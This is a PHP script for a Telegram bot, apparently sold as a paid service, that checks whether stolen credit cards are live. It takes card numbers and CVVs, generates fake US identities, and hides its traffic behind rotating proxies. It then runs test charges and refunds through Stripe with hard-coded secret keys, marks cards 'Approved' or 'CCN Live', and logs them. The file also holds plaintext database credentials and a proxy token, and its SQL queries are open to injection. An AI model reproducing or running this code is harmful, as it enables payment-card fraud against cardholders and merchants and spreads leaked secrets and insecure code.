<?php
if(strpos($message, '!str') === 0 or strpos($message, '/str') === 0 or strpos($message, '.str') === 0){
    $keyboard = [
    'inline_keyboard' => [[['text' => 'Features', 'callback_data' => 'paid'], ['text' => 'Buy', 'callback_data' => 'buy'], ['text' => 'Buy Now', 'url' => 'https://t.me/mausampekapan'],]]];
$keyboard = json_encode($keyboard);
checkrole($chatId,$message_id,$keyboard,$nopre,$gId);
$starttime = microtime(true);
$flag = 'getFlags';
$mytime = 'time1';

$link = mysqli_connect("sql12.freesqldatabase.com", "sql12601606", "pfCeZJB1Ee", "sql12601606");
    $sql = "SELECT time FROM persons WHERE userid='$gId'";
    $result20 = mysqli_query($link, $sql);
    $json_array = [];
    while ($row = mysqli_fetch_assoc($result20)) {
    $json_array[] = $row;
    }
    $final20 = json_encode($json_array);
    $times = trim(strip_tags(getStr($final20, '"time":"','"')));
mysqli_close($link);

$link = mysqli_connect("sql12.freesqldatabase.com", "sql12601606", "pfCeZJB1Ee", "sql12601606");
    $sql = "SELECT role FROM persons WHERE userid='$gId'";
    $result20 = mysqli_query($link, $sql);
    $json_array = [];
    while ($row = mysqli_fetch_assoc($result20)) {
      $json_array[] = $row;
    }
    $final201 = json_encode($json_array);
    $role = trim(strip_tags(getStr($final201, '"role":"','"')));
mysqli_close($link);
$current = time();
$sec = $current - $times;
if($role == 'MEMBER' and $sec < 20)
{
 $after = 20 - $sec;
  $antispam = urlencode ("<b>[ANTISPAM] <i> TRY AGAIN AFTER $after sec.</i></b>");
reply_to($chatId,$message_id,$keyboard,$antispam);
 exit();
}elseif($role == 'USER' and $sec < 120)
{
 $after = 120 - $sec;
  $antispam = urlencode ("<b>[ANTISPAM] <i> TRY AGAIN AFTER $after sec.</i></b>");
reply_to($chatId,$message_id,$keyboard,$antispam);
 exit();
}elseif(empty($role)){
 reply_to($chatId,$message_id,$keyboard,$noregister);
 exit();
}
sendaction($chatId, typing);
$lista = substr($message, 5);
$lista = clean($lista);
$check = strlen($lista);
$chem = substr($lista, 0,1);
$cc = multiexplode(array(":", "/", " ", "|", ""), $lista)[0];
$mes = multiexplode(array(":", "/", " ", "|", ""), $lista)[1];
$ano = multiexplode(array(":", "/", " ", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "/", " ", "|", ""), $lista)[3];
$strlenn = strlen($cc);
$strlen1 = strlen($mes);
$ano1 = $ano;
$list = ''.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'';
$vaut = array(1,2,3,7,8,9,0);
if (in_array($chem, $vaut)) { 
    reply_to($chatId, $message_id,$keyboard,$validauth);
    exit();
  } 
if (empty($lista)){
    reply_to($chatId, $message_id,$keyboard,$validauth);
    exit();
}elseif($check<15){
    reply_to($chatId, $message_id,$keyboard,$validauth);
    exit();
}elseif(strlen($strlenn != 16)){
    reply_to($chatId, $message_id,$keyboard,$validauth);
    exit();
}
if(strlen($strlen1 > 2)) {
$ano = $cvv; 
$cvv = $mes;
$mes = $ano1;}
$sss = reply_to($chatId,$message_id,$keyboard,"<b> CC ->> <code>$cc|$mes|$ano|$cvv</code> %0APROCESS ->> □□□□□ 0%[🟥] %0ATIME ->> {$mytime($starttime)}s %0ACHECKING BY ->> <a href='tg://user?id=$gId'>@$username</a> %0ABOT BY :- <code>@mausampekapan</code></b>");
$respon = json_decode($sss, TRUE);
$message_id_1 = $respon['result']['message_id'];
///////////////////////////////////////////////////////////////////////////////////////////////////////////////
sendaction($chatId, typing);
$get = file_get_contents('https://randomuser.me/api/1.2/?nat=US');
    preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
    $first = $matches1[1][0];
    preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
    $last = $matches1[1][0];
    preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
    $email = $matches1[1][0];
    preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
    $street = $matches1[1][0];
    preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
    $city = $matches1[1][0];
    preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
    $state = $matches1[1][0];
    $state1 = $matches1[1][0];
    preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
    $phone = $matches1[1][0];
    preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
    $zip = $matches1[1][0];
    preg_match_all("(\"username\":\"(.*)\")siU", $get, $matches1);
    $usrnme = $matches1[1][0];
    preg_match_all("(\"password\":\"(.*)\")siU", $get, $matches1);
    $pass = $matches1[1][0];
    preg_match_all("(\"salt\":\"(.*)\")siU", $get, $matches1);
    $salt = $matches1[1][0];
    $pwd = ''.$pass.''.$salt.'';
    preg_match_all("(\"nat\":\"(.*)\")siU", $get, $matches1);
    $con = $matches1[1][0];
    $numero1 = substr($phone, 1,3);
    $numero2 = substr($phone, 6,3);
    $numero3 = substr($phone, 10,4);
    $phone = $numero1.''.$numero2.''.$numero3;
    $serve_arr = array("gmail.com","hotmail.com","yahoo.com","yopmail.com","outlook.com");
    $serv_rnd = $serve_arr[array_rand($serve_arr)];
    $email = str_replace("example.com", $serv_rnd, $email);
    $state = state($state);
$bin = substr($cc,0,6);
    $ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$bin.'');
curl_setopt($ch, CURLOPT_USERAGENT, $user_agent);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
));
edit_message($chatId,$message_id_1,$keyboard,"<b> CC ->> <code>$cc|$mes|$ano|$cvv</code> %0APROCESS ->> ■□□□□ 20%[⬛] %0ATIME ->> {$mytime($starttime)}s %0ACHECKING BY ->> <a href='tg://user?id=$gId'>@$username</a> %0ABOT BY :- <code>@mausampekapan</code></b>");
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$fim = json_decode($fim,true);
$roldex = $fim['bank']['name'];
$bincap2 = $fim['country']['alpha2'];
$bincap4 = $fim['type'];
$bincap3 = $fim['scheme'];
$bincap5 = $fim['brand'];
$che = bannedbin($bin);
if(strpos($fim, '"type":"credit"') !== false) {
  $type = 'Credit';
} else {
  $type = 'Debit';
}
curl_close($ch);
    if(!isset($fim) or $che == true) {
    edit_message($chatId,$message_id_1,$keyboard, "<b>❌BIN BANNED</b>");
    exit();
    }
    
    
edit_message($chatId,$message_id_1,$keyboard,"<b> CC ->> <code>$cc|$mes|$ano|$cvv</code> %0APROCESS ->> ■■□□□ 40%[🟧] %0ATIME ->> {$mytime($starttime)}s %0ACHECKING BY ->> <a href='tg://user?id=$gId'>@$username</a> %0ABOT BY :- <code>@mausampekapan</code></b>");

#################[Webshare Proxy]#######################

        //How To Make Webshare Token First Make Your Webshare [FREE] OR [PAID] Acc Then Go To Webshare Dashboard. 
        //Dashboard There You Get One Button With Then Name Of API Go There And Select Keys Make Token From There.e.

        $web = array(
        1 => 'f66d7b03d069de4032495dc4a61a9cc8324de293', //2a952592de542903da4c865330b95795db1ffdcb
       // 2 => '8bb8e58a67bb469e48bdbdbe3267129b41bc6b80', 
          ); 
          $share = array_rand($web);
          $webshare_token = $web[$share];

        $prox = curl_init();
        curl_setopt($prox, CURLOPT_URL, 'https://proxy.webshare.io/api/proxy/list/');
        curl_setopt($prox, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($prox, CURLOPT_CUSTOMREQUEST, 'GET');
        $headers = array();
        $headers[] = 'Authorization: Token '.$webshare_token.'';
        curl_setopt($prox, CURLOPT_HTTPHEADER, $headers);
        $webshare = curl_exec($prox);
        
        curl_close($prox);

        $prox_res = json_decode($webshare, 1);
        $count = $prox_res['count'];
        $random = rand(0,$count-1);

        $proxy_ip = $prox_res['results'][$random]['proxy_address'];
        $proxy_port = $prox_res['results'][$random]['ports']['socks5'];
        $proxy_user = $prox_res['results'][$random]['username'];
        $proxy_pass = $prox_res['results'][$random]['password'];

        $proxy = ''.$proxy_ip.':'.$proxy_port.'';
        $credentials = ''.$proxy_user.':'.$proxy_pass.'';
        $useragent="Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.1) Gecko/20061204 Firefox/2.0.0.1";

        // FOR SHOWING IP OR PROXY ADD THIS IN Responses [IP :- '.$proxy.']

        #################[Proxy Live Tester Made By Dragon Master]#######################

        $rotate = ''.$proxy_user.'-rotate:'.$proxy_pass.'';

        $ip = array(
        1 => 'socks5://p.webshare.io:1080',
        2 => 'http://p.webshare.io:80',
             ); 
             $socks = array_rand($ip);
             $socks5 = $ip[$socks];

        $url = "https://api.ipify.org/";
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_PROXY, $socks5);
        curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate); 
        $ip1 = curl_exec($ch);
        curl_close($ch);
        ob_flush();
        if (isset($ip1)){
        $ip = 'Live ✅';
        }
        if (empty($ip1)){
        $ip = ' Dead❌';
        }
# -------------------- [1 REQ] -------------------#

$skArray = array(
    
   
    //1 => 'sk_live_69GKI0saLB8uIEnxzv8VTvRX',
    
 2 => ' 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',
    
   // 2 => 'sk_live_Yg3BCYRPuomB9AZVtsaQh3nF',
  

);

if (isset($skArray)) { 
 $sk = $skArray[array_rand($skArray)]; 
} else {
    echo 'YOU SUCK BRO';
}

$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, "http://p.webshare.io:80"); 
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/sources');
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
  curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&owner[name]=carolprogay&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'');
   $result1 = curl_exec($ch);
  $s = json_decode($result1, true);
  
  $token = $s['id'];


edit_message($chatId,$message_id_1,$keyboard,"<b> CC ->> <code>$cc|$mes|$ano|$cvv</code> %0APROCESS ->> ■■■□□ 60%[🟧] %0ATIME ->> {$mytime($starttime)}s %0ACHECKING BY ->> <a href='tg://user?id=$gId'>@$username</a> %0ABOT BY :- <code>@mausampekapan</code></b>");

$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, "http://p.webshare.io:80"); 
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/customers');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'description='.$name.' '.$last.'&source='.$token.'');
curl_setopt($ch, CURLOPT_USERPWD, $sk . ':' . '');
$headers = array();
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
   $result2 = curl_exec($ch);
  $cus = json_decode($result2, true);
$token3 = $cus['id'];

   // echo $token1 = $cus['id'];
   //  echo $token1 = $cus['id'];
 $message = trim(strip_tags(getStr($result2,'"message": "','"')));

 $cvvcheck = trim(strip_tags(getStr($result2,'"cvc_check": "','"')));

 $declinecode = trim(strip_tags(getStr($result2,'"code": "','"')));

echo "<span>  cvv_check = ".$cvvcheck."</span>";

edit_message($chatId,$message_id_1,$keyboard,"<b> CC ->> <code>$cc|$mes|$ano|$cvv</code> %0APROCESS ->> ■■■■□ 80%[🟨] %0ATIME ->> {$mytime($starttime)}s %0ACHECKING BY ->> <a href='tg://user?id=$gId'>@$username</a> %0ABOT BY :- <code>@mausampekapan</code></b>");
//[Charge Section]
 curl_setopt($ch, CURLOPT_PROXY, "http://p.webshare.io:80"); 
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
  curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/charges');
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  curl_setopt($ch, CURLOPT_POSTFIELDS, 'amount=100&currency=inr&customer='.$token3.'');
  curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
  $result3 = curl_exec($ch);

   $char = json_decode($result3, true);
 $chtoken = trim(strip_tags(getStr($result3,'"charge": "','"')));
   $chargetoken = $char['charge'];
$decline3 = trim(strip_tags(getStr($result3,'"decline_code": "','"')));
$recpul = trim(strip_tags(getStr($result,'"receipt_url": "','"')));

  $ch = curl_init();
  curl_setopt($ch, CURLOPT_PROXY, "http://p.webshare.io:80"); 
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
  curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/refunds');
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  curl_setopt($ch, CURLOPT_POSTFIELDS, 'charge='.$chtoken.'&amount=100&reason=requested_by_customer');
  curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
 $result4 = curl_exec($ch);
 
 
 $recpul = trim(strip_tags(getStr($result3,'"receipt_url": "','"')));

curl_close($ch);
edit_message($chatId,$message_id_1,$keyboard,"<b> CC ->> <code>$cc|$mes|$ano|$cvv</code> %0APROCESS ->> ■■■■■ 100%[🟩] %0ATIME ->> {$mytime($starttime)}s %0ACHECKING BY ->> <a href='tg://user?id=$gId'>@$username</a> %0ABOT BY :- <code>@mausampekapan</code></b>");

//////////////////////////////////////////////////////////////////////////////////////////////////////////////

if (strpos($result3, '"cvc_check":"pass"')) {
  $status = 'Approved✅';
  $cc_code = 'CVV PASS';
  $author = 'CVV Matched';
  cvv($list);
}elseif (strpos($result3, '"cvc_check": "pass"')) {
  $status = 'Approved✅';
  $cc_code = 'CVV PASS';
  $author = 'CVV Matched';
    cvv($list);
}elseif(strpos($result3, "Thank You For Donation." )) {
  $status = 'Approved✅';
  $cc_code = 'CHARGED ';
  $author = 'CVV Matched';
    cvv($list);
}elseif(strpos($result3, "Thank You." )) {
  $status = 'Approved✅';
  $cc_code = 'CHARGED';
  $author = 'CVV matched';
    cvv($list);
}elseif(strpos($result3, "Your card has insufficient funds." )) {
  $status = 'Approved✅';
  $cc_code = 'Your card has insufficient funds.';
  $author = 'CVV matched';
    cvv($list);
}elseif(strpos($result3, "Your card's security code is incorrect" )) {
  $status = 'Approved✅';
  $cc_code = 'CCN Live';
    ccn($list);
}elseif(strpos($result2, "Your card's security code is incorrect" )) {
  $status = 'Approved✅';
  $cc_code = 'CCN Live';
    ccn($list);
}elseif(strpos($result3, 'security code is invalid.' )) {
  $status = 'Approved✅';
  $cc_code = 'CCN Live';
      ccn($list);
}elseif(strpos($result3, 'Invalid service code (restricted)' )) {
  $status = 'Approved✅';
  $cc_code = 'CCN or CVV Live';
      ccn($list);
}elseif (strpos($result3, "Invalid CVV value")) {
  $status = 'Approved✅';
  $cc_code = 'CCN Live';
      ccn($list);
} elseif (strpos($result3, "Card is expired")) {
  $status = 'Dead❌';
  $cc_code = 'Expired';
}elseif(strpos($result3, 'Invalid Card Number' )) {
  $status = 'Betichod❌';
  $cc_code = 'incorrect_zip';
}elseif (strpos($result3, "Hold card (stolen)")) {
  $status = 'Approved✅';
  $cc_code = 'Hold card (stolen)';
}elseif (strpos($result3, "stolen_card")) {
  $status = 'Approved✅';
  $cc_code = 'Hold card (stolen)';
}elseif (strpos($result3, "pickup_card")) {
  $status = 'Approved✅';
  $cc_code = 'Hold card (pickup)';
}elseif (strpos($result3, 'action="./fee_declined.php" ')) {
  $status = 'Error❌';
  $cc_code = 'Fee Decline(Does Not Support Card)';
}elseif(strpos($result3, 'Card number error')) {
  $status = 'Declined ❌';
  $cc_code = 'Card number error';
}elseif(strpos($result3, 'No such issuer')) {
  $status = 'Declined ❌';
  $cc_code = 'NO SUCH ISSUER. Returned when the first 6 digits of the card number are not recognized by the Issuer.Re-enter transaction.';
}elseif (strpos($result3, "pickup_card")) {
  $status = 'Approved✅';
  $cc_code = 'pickup_card';
  cvv($list);
}elseif(strpos($result3, 'Your card number is incorrect.')) {
  $status = 'Declined ❌';
  $cc_code = 'incorrect_number';
}elseif (strpos($result3, "incorrect_number")) {
  $status = 'Declined ❌';
  $cc_code = 'incorrect_number';
}elseif(strpos($result3, 'do_not_honor')) {
  $status = 'Declined ❌';
  $cc_code = 'do_not_honor';
}elseif(strpos($result2, 'do_not_honor')) {
  $status = 'Declined ❌';
  $cc_code = 'do_not_honor';
}elseif (strpos($result3, "generic_decline")) {
  $status = 'Declined ❌';
  $cc_code = 'generic_decline';
}elseif (strpos($result1, "Your card was declined.")) {
  $status = 'Declined ❌';
  $cc_code = 'Card Declined';
}elseif (strpos($result3, "Your card was declined.")) {
  $status = 'Declined ❌';
  $cc_code = 'Card Declined';
}elseif (strpos($result3, "fraudulent")) {
  $status = 'Declined ❌';
  $cc_code = 'Fraudlent';
}elseif (strpos($result3, '"cvc_check": "unchecked"')) {
  $status = 'Declined ❌';
  $cc_code = 'unchecked';
}elseif (strpos($result3, 'Transaction not permitted (Card)')) {
  $status = 'Declined ❌';
  $cc_code = 'Transaction not permitted (Card)';
}elseif (strpos($result3, "You have tried this card too many times, please contact merchant.")) {
  $status = 'Declined❌';
  $cc_code = 'You have tried this card too many times, please contact merchant.';
}elseif (strpos($result3,'Your card does not support this type of purchase.')) {
  $status = 'Declined ❌';
  $cc_code = 'Merchant does not accept this card, try a different card';
}else{
  $status = 'Declined ❌';
  $cc_code = 'Unknown Errror.';
}

$result = urlencode("<b>
GATE --> <i>STRIPE - AUTH</i>
———-»Card Info«-———-
CC : <code>$cc|$mes|$ano|$cvv</code>
Result : $status
Message : $cc_code
Receipt : $recpul
———-»Bank Info«-———-
Bank Name : $roldex
Country : $bincap2-{$flag($bincap2)}
Bin Info : $bincap4-$bincap3-$bincap5
———-»User Info«-———-
Time : {$mytime($starttime)}s
Checked By :  <a href='tg://user?id=$gId'>@${username}
</a>[<i>$role</i>]
Proxy : Proxy $ip
Bot By : <code>@mausampekapan</code></b>");
edit_message($chatId,$message_id_1,$keyboard, $result);
    rest($list);
    $timest = time();

$link = mysqli_connect("sql12.freesqldatabase.com", "sql12601606", "pfCeZJB1Ee", "sql12601606");
    $sql = "UPDATE persons SET time = '$timest' WHERE persons.userid='$gId'";
    $result21 = mysqli_query($link, $sql);
mysqli_close($link);
}
?>